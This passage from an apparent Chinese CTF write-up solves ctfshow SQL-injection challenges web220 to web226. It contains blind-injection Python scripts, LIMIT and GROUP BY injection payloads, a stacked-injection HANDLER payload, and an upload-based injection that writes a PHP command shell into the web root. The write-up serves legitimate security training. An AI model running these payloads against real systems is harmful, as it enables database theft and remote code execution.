</span></span><span class="line"><span class="ln">28</span><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.15</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">            <span class="c1"># 如果请求在1秒内返回，说明当前位置字符的ASCII码小于等于中间值</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">            <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">Timeout</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">            <span class="c1"># 如果请求超时，说明当前位置字符的ASCII码大于中间值</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">            <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;An unexpected error occurred: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">
</span></span><span class="line"><span class="ln">41</span><span class="cl">    <span class="k">if</span> <span class="n">head</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">        <span class="c1"># 如果找到有效的字符，将其添加到结果字符串中</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl">        <span class="c1"># 如果没有找到有效字符，退出循环</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl">
</span></span><span class="line"><span class="ln">48</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*]Result : &#34;</span><span class="o">+</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></div><h4 id="web220">web220<a hidden class="anchor" aria-hidden="true" href="#web220">#</a></h4>
<pre tabindex="0"><code>查询语句

       where id = ($id);
      
返回逻辑

    //屏蔽危险分子
    function waf($str){
        return preg_match(&#39;/sleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr/i&#39;,$str);
    }   
      
</code></pre><p>substr用left代替即可，有点像之前布尔盲注的一道题，只是改成了时间盲注罢了</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://52728b9a-ffae-4f96-b51f-0549bb5cb4e0.challenge.ctf.show/api/&#34;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nb">str</span><span class="o">=</span><span class="s2">&#34; _</span><span class="si">{}</span><span class="s2">-&#34;</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">45</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">        <span class="c1"># payload = &#34;select table_name from information_schema.tables where table_schema=database() limit 0,1&#34;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">        <span class="c1"># payload = &#34;select column_name from information_schema.columns where table_name=&#39;ctfshow_flagxcac&#39; limit 1,1&#34;</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;select flagaabcc from ctfshow_flagxcac&#34;</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">            <span class="s1">&#39;ip&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;1) or if(LEFT((</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">)regexp(&#39;</span><span class="si">{</span><span class="n">result</span><span class="o">+</span><span class="n">j</span><span class="si">}</span><span class="s2">&#39;),(select count(*) from information_schema.columns A, information_schema.columns B),1)#&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">            <span class="s1">&#39;debug&#39;</span><span class="p">:</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.15</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="n">result</span> <span class="o">=</span> <span class="n">result</span> <span class="o">+</span> <span class="n">j</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] loading :&#34;</span><span class="o">+</span><span class="n">result</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] result :&#34;</span><span class="o">+</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></div><h4 id="web221">web221<a hidden class="anchor" aria-hidden="true" href="#web221">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">查询语句</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl">  <span class="c1">//分页查询
</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="nx">select</span> <span class="o">*</span> <span class="nx">from</span> <span class="nx">ctfshow_user</span> <span class="nx">limit</span> <span class="p">(</span><span class="nv">$page</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="nv">$limit</span><span class="p">,</span><span class="nv">$limit</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">      
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">
</span></span><span class="line"><span class="ln">8</span><span class="cl"><span class="c1">//TODO:很安全，不需要过滤
</span></span></span><span class="line"><span class="ln">9</span><span class="cl"><span class="c1">//拿到数据库名字就算你赢
</span></span></span></code></pre></div><p>p神的文章有提到limit注入</p>
<p><a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html">[转载]Mysql下Limit注入方法 | 离别歌</a></p>
<p><img alt="image-20250214215951430" loading="lazy" src="../assets/image-20250214215951430.png"></p>
<p>payload:</p>
<pre tabindex="0"><code>?page=1&amp;limit=1%20procedure%20analyse(extractvalue(rand(),concat(0x3a,database())),1)
</code></pre><p><img alt="image-20250214220519994" loading="lazy" src="../assets/image-20250214220519994.png"></p>
<h4 id="group注入">group注入<a hidden class="anchor" aria-hidden="true" href="#group注入">#</a></h4>
<h4 id="web222">web222<a hidden class="anchor" aria-hidden="true" href="#web222">#</a></h4>
<pre tabindex="0"><code>查询语句

  //分页查询
  $sql = select * from ctfshow_user group by $username;
      
返回逻辑

//TODO:很安全，不需要过滤
</code></pre><p><img alt="image-20250215150334370" loading="lazy" src="../assets/image-20250215150334370.png"></p>
<p>group by 可以进行时间盲注，布尔盲注等</p>
<p>本来以为是报错注入的，发现好像不太行</p>
<p>还是的时间盲注</p>
<p>拿前面的盲注脚本改一改</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://529d9311-c036-4831-bfa1-b2ca91dae190.challenge.ctf.show/api/?u=&#34;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="c1"># ASCII码范围，32到127是可打印字符的范围</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="c1"># 二分查找的中间值</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="c1"># 查表名</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(table_name) from information_schema.tables where table_schema=database()&#34;</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="c1"># 查列名字</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="c1"># payload = &#34;select column_name from information_schema.columns where table_name=&#39;ctfshow_flaga&#39; limit 1,1&#34;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="c1"># 爆字段</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;select flagaabc from ctfshow_flaga&#34;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;concat((if (ascii(substr((</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">, sleep(0.05), 2)), 1);&#34;</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.05</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">            <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">Timeout</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">            <span class="c1"># 如果请求超时，说明当前位置字符的ASCII码大于中间值</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">            <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;An unexpected error occurred: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">
</span></span><span class="line"><span class="ln">38</span><span class="cl">    <span class="k">if</span> <span class="n">head</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">        <span class="c1"># 如果找到有效的字符，将其添加到结果字符串中</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">        <span class="c1"># 如果没有找到有效字符，退出循环</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*]Result : &#34;</span><span class="o">+</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></div><h4 id="web223">web223<a hidden class="anchor" aria-hidden="true" href="#web223">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">查询语句</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl">  <span class="c1">//分页查询
</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="nx">select</span> <span class="o">*</span> <span class="nx">from</span> <span class="nx">ctfshow_user</span> <span class="nx">group</span> <span class="nx">by</span> <span class="nv">$username</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">      
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">
</span></span><span class="line"><span class="ln">8</span><span class="cl"><span class="c1">//TODO:很安全，不需要过滤
</span></span></span><span class="line"><span class="ln">9</span><span class="cl"><span class="c1">//用户名不能是数字
</span></span></span></code></pre></div><p>这题ban掉了数字</p>
<p>用true来构造出数字即可</p>
<p>这题一开始我想用时间盲注的，但是跑不出来，后面直接拿y4✌的布尔盲注跑了</p>
<p>如下</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://14dc1900-f046-44e8-bfa2-e93fbc2a32b3.challenge.ctf.show/api/?u=&#34;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">def</span> <span class="nf">createNum</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="n">num</span> <span class="o">=</span> <span class="s1">&#39;true&#39;</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="k">if</span> <span class="n">n</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">        <span class="k">return</span> <span class="s1">&#39;true&#39;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span> <span class="o">-</span> <span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">            <span class="n">num</span> <span class="o">+=</span> <span class="s2">&#34;+true&#34;</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">return</span> <span class="n">num</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="c1"># ASCII码范围，32到127是可打印字符的范围</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="c1"># 二分查找的中间值</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="c1"># 查数据库-ctfshow_flagas</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(table_name) from information_schema.tables where table_schema=database()&#34;</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">        <span class="c1"># 查字段-flagasabc</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flagas&#39;&#34;</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">        <span class="c1"># 查flag</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;select flagasabc from ctfshow_flagas&#34;</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">
</span></span><span class="line"><span class="ln">33</span><span class="cl">
</span></span><span class="line"><span class="ln">34</span><span class="cl">        <span class="n">params</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">            <span class="c1"># &#34;u&#34;: f&#34;if(ascii(substr(({payload}),{createNum(i)},{createNum(1)}))&gt;{createNum(mid)},sleep(true),true)&#34;  #时间盲注 （我没跑出来，不知道为啥</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">            <span class="s2">&#34;u&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;if(ascii(substr((</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">createNum</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">,</span><span class="si">{</span><span class="n">createNum</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="si">}</span><span class="s2">))&gt;</span><span class="si">{</span><span class="n">createNum</span><span class="p">(</span><span class="n">mid</span><span class="p">)</span><span class="si">}</span><span class="s2">,username,&#39;a&#39;)&#34;</span> <span class="c1">#布尔盲注</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">
</span></span><span class="line"><span class="ln">39</span><span class="cl">        <span class="c1"># try:</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">        <span class="c1">#     r = requests.post(url,params=params,timeout=1)</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">        <span class="c1">#     tail = mid</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">        <span class="c1"># except Exception as e:</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">        <span class="c1">#     head = mid + 1</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">
</span></span><span class="line"><span class="ln">45</span><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl">        <span class="k">if</span> <span class="s2">&#34;userAUTO&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl">            <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">48</span><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">49</span><span class="cl">            <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="ln">50</span><span class="cl">
</span></span><span class="line"><span class="ln">51</span><span class="cl">    <span class="k">if</span> <span class="n">head</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">52</span><span class="cl">        <span class="c1"># 如果找到有效的字符，将其添加到结果字符串中</span>
</span></span><span class="line"><span class="ln">53</span><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">54</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">55</span><span class="cl">        <span class="c1"># 如果没有找到有效字符，退出循环</span>
</span></span><span class="line"><span class="ln">56</span><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="ln">57</span><span class="cl">
</span></span><span class="line"><span class="ln">58</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></div><p>布尔盲注这么快，我为什么要想不开尝试时间盲注呢</p>
<h4 id="web224">web224<a hidden class="anchor" aria-hidden="true" href="#web224">#</a></h4>
<p><img alt="image-20250216153130500" loading="lazy" src="../assets/image-20250216153130500.png"></p>
<p>试了试万能密码，失败了</p>
<p>访问/robots.txt</p>
<p>发现有重置密码的路由</p>
<p><img alt="image-20250216153239173" loading="lazy" src="../assets/image-20250216153239173.png"></p>
<p>修改密码之后登入，看到一个文件上传</p>
<p><img alt="image-20250216153307127" loading="lazy" src="../assets/image-20250216153307127.png"></p>
<p><a href="https://blog.csdn.net/weixin_48083470/article/details/120608011">ctfshow web224 sql_文件上传产生sql注入 详解_sql注入漏洞ctf文件上传-CSDN博客</a></p>
<p>这是一道文件上传的sql注入题</p>
<p>当文件上传时，后台会将文件名，文件路径，文件类型（文件头）直接与sql语句进行拼接</p>
<p>所以我们可以构造一个恶意文件，将文件头改写成我们要拼接的sql语句，从而实现注入</p>
<p>如图</p>
<p><img alt="在这里插入图片描述" loading="lazy" src="../assets/ddeff9345ea8c8859aab77907198ff9a.png"></p>
<p>payload:</p>
<pre tabindex="0"><code>C64File &#34;&#39;);select 0x3c3f3d60746163202f662a603f3e into outfile &#39;/var/www/html/1.php&#39;;--+
</code></pre><p><img alt="image-20250216153811510" loading="lazy" src="../assets/image-20250216153811510.png"></p>
<p><img alt="image-20250216153856343" loading="lazy" src="../assets/image-20250216153856343.png"></p>
<p>新建文本，写入payload，改名为1.bin，上传文件，访问1.bin拿到flag</p>
<h4 id="堆叠注入">堆叠注入<a hidden class="anchor" aria-hidden="true" href="#堆叠注入">#</a></h4>
<h4 id="web225">web225<a hidden class="anchor" aria-hidden="true" href="#web225">#</a></h4>
<p>没有过滤show</p>
<pre tabindex="0"><code>username=1&#39;;show tables;
</code></pre><p><img alt="image-20250216154601897" loading="lazy" src="../assets/image-20250216154601897.png"></p>
<p>可以用handler读</p>
<p>payload:</p>
<pre tabindex="0"><code>username=ctfshow&#39;;show tables;handler ctfshow_flagasa open;handler ctfshow_flagasa read first;
</code></pre><p><img alt="image-20250216154743625" loading="lazy" src="../assets/image-20250216154743625.png"></p>
<blockquote>
<p>1.<code>handler ctfshow_flag as a open;</code></p>
<p><code>HANDLER</code> 语句是 MySQL 中用于直接操作表的一种特殊方式。此语句的作用是打开一个名为 <code>ctfshow_flag</code> 的表，并将其别名为 <code>a</code>。<code>HANDLER</code> 语句可以绕过一些常规的查询机制，直接访问表的数据，通常用于高效地获取数据。</p>
<p>2.<code>handler ctfshow_flag as a read first;</code></p>
<p>该语句继续使用 <code>HANDLER</code> 来操作之前打开的 <code>ctfshow_flag</code> 表（别名 <code>a</code>），<code>read first</code> 表示读取表中的第一行数据。</p></blockquote>
<p>其他方法</p>
<p><img alt="image-20250216155035890" loading="lazy" src="../assets/image-20250216155035890.png"></p>
<h4 id="web226">web226<a hidden class="anchor" aria-hidden="true" href="#web226">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">查询语句</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="c1">//分页查询
